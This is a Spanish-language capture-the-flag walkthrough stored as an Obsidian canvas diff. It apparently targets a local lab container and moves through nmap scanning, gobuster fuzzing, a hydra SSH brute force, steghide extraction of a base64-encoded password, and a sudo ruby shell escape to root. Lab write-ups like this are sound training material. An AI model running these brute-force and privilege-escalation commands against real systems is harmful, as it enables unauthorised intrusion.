@@ -1,0 +1,37 @@
+{
+	"nodes":[
+		{"id":"0f11ed2a9bcf57c5","type":"text","text":"escaneo los puertos con nmap\n\nnmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 172.17.0.2","x":-1082,"y":-1400,"width":660,"height":120,"color":"5"},
+		{"id":"83d41839c4171b54","type":"text","text":"encuentro el puerto 22y 80 abierto reviso que versiones y srvicios corren ahi \n\nnmap -sCV -p22,80 -vvv  172.17.0.2","x":40,"y":-1400,"width":580,"height":140,"color":"5"},
+		{"id":"b97a663780e591e8","type":"text","text":"no encentro nada en el codigo http hago fuerza bruta en el usuario carlota \n\n```\nhydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2\n```","x":-1080,"y":-1240,"width":585,"height":200,"color":"5"},
+		{"id":"36253af7a186487e","type":"text","text":"fuzzing web\n\ngobuster dir -u \"http://172.17.0.2/\" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt","x":41,"y":-1220,"width":580,"height":160,"color":"5"},
+		{"id":"51e7387416ae026b","type":"text","text":"encuentro la contrasena \n\n```\n❯ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-20 10:42:02\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://172.17.0.2:22/\n[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl\n1 of 1 target successfully completed, 1 valid password found\n```","x":-1082,"y":-975,"width":900,"height":420,"color":"5"},
+		{"id":"7adfb24b3d5ea4e7","type":"text","text":"entro a la shell \n\nssh carlota@172.17.0.2","x":46,"y":-975,"width":345,"height":100,"color":"5"},
+		{"id":"56b47a2e3bc5e483","type":"text","text":"listo los directorios \n\nsudo -l y encuentro una imagen ","x":41,"y":-800,"width":405,"height":170,"color":"5"},
+		{"id":"8f0096f60f7d04cd","type":"text","text":"le aplico estsenografia  a la imagen ```\n\n```\n\nsteghide extract -sf imagen.jpg\n```\nEnter passphrase: \nwrote extracted data to \"secret.txt\".\n```","x":-1080,"y":-490,"width":658,"height":220,"color":"5"},
+		{"id":"4d2c8b2fb0937212","type":"text","text":"descargo la imagen iniciando un servidor en python \n\npython3 -m http.server 8080\n\ndesde la maquina atacante \n\nwget http://172.17.0.2:8080/imagen.jpg","x":-4,"y":-490,"width":625,"height":220,"color":"5"},
+		{"id":"c32e14394f5926b2","type":"text","text":"leo el archivo oculto en la imagen \n\n```\ncat secret.txt\nZXNsYWNhc2FkZXBpbnlwb24=\n```","x":-1080,"y":-210,"width":516,"height":260,"color":"5"},
+		{"id":"77d577004d253756","type":"text","text":"con chatgpt descubro que es codigo base 64\n\n```\neslacasadepinypon\n```\nconsigo esta contrasena","x":20,"y":-185,"width":578,"height":210,"color":"5"},
+		{"id":"35b22ac91eab64b8","type":"text","text":"me dirigo al directorio raiz y encuentro otros usuario\n\ncarlota@d7b55dad8c9e:/home$ ll\n root    4096 May 20 07:53 ../                \n carlota carlota 4096 May 20 07:57 carlota/            \n  oscar   4096 Apr 26 11:02 oscar/             \n  ubuntu  4096 Apr 23 15:31 ubuntu/","x":20,"y":135,"width":745,"height":210,"color":"5"},
+		{"id":"80b04ce47b738031","type":"text","text":"escalo privilegios en el usuario oscar con la contrasena encontrada en la imagen\n\nsu oscar","x":-1080,"y":135,"width":492,"height":150,"color":"5"},
+		{"id":"f05a6b8b09566f0d","type":"text","text":"en el usarui oscar listo los directorios \n\nsudo -l\n\n```\n (ALL) NOPASSWD: /usr/bin/ruby \n```","x":-1080,"y":440,"width":404,"height":200,"color":"5"},
+		{"id":"639c68ff4413ba22","type":"text","text":"en chatgpt encuentro como escaloar privilegios en ruby mediante un script en bash\n\nsudo ruby -e 'exec \"/bin/sh\"'","x":20,"y":440,"width":494,"height":150,"color":"5"},
+		{"id":"64f59471fc0a6c09","type":"text","text":"y listo uso whoami y soy root\n\n```\n# whoami                                                                                                                                                                                                                                    \nroot\n```","x":20,"y":720,"width":699,"height":230,"color":"5"}
+	],
+	"edges":[
+		{"id":"242382d85dd7d990","fromNode":"0f11ed2a9bcf57c5","fromSide":"right","toNode":"83d41839c4171b54","toSide":"left"},
+		{"id":"43f530a0a0d7f712","fromNode":"83d41839c4171b54","fromSide":"bottom","toNode":"36253af7a186487e","toSide":"top"},
+		{"id":"26493ad944dccf27","fromNode":"36253af7a186487e","fromSide":"left","toNode":"b97a663780e591e8","toSide":"right"},
+		{"id":"fcee372c4e2009c0","fromNode":"b97a663780e591e8","fromSide":"bottom","toNode":"51e7387416ae026b","toSide":"top"},
+		{"id":"fa3e10c292d72288","fromNode":"51e7387416ae026b","fromSide":"right","toNode":"7adfb24b3d5ea4e7","toSide":"left"},
+		{"id":"0d0521ed11dbae20","fromNode":"7adfb24b3d5ea4e7","fromSide":"bottom","toNode":"56b47a2e3bc5e483","toSide":"top"},
+		{"id":"1523d6b7f5e645cb","fromNode":"56b47a2e3bc5e483","fromSide":"bottom","toNode":"4d2c8b2fb0937212","toSide":"top"},
+		{"id":"f7a7f43b94ea6690","fromNode":"4d2c8b2fb0937212","fromSide":"left","toNode":"8f0096f60f7d04cd","toSide":"right"},
+		{"id":"a1c6ef375c0dd4fe","fromNode":"8f0096f60f7d04cd","fromSide":"bottom","toNode":"c32e14394f5926b2","toSide":"top"},
+		{"id":"5bbd879e2ae02c8e","fromNode":"c32e14394f5926b2","fromSide":"right","toNode":"77d577004d253756","toSide":"left"},
+		{"id":"c709e413205147ca","fromNode":"77d577004d253756","fromSide":"bottom","toNode":"35b22ac91eab64b8","toSide":"top"},
+		{"id":"cdb7c5a7beaffc62","fromNode":"35b22ac91eab64b8","fromSide":"left","toNode":"80b04ce47b738031","toSide":"right"},
+		{"id":"1a3e4c98fc67f29b","fromNode":"80b04ce47b738031","fromSide":"bottom","toNode":"f05a6b8b09566f0d","toSide":"top"},
+		{"id":"5b68fc16500906a4","fromNode":"f05a6b8b09566f0d","fromSide":"right","toNode":"639c68ff4413ba22","toSide":"left"},
+		{"id":"57e38e0687b2ef8b","fromNode":"639c68ff4413ba22","fromSide":"bottom","toNode":"64f59471fc0a6c09","toSide":"top"}
+	]
+}
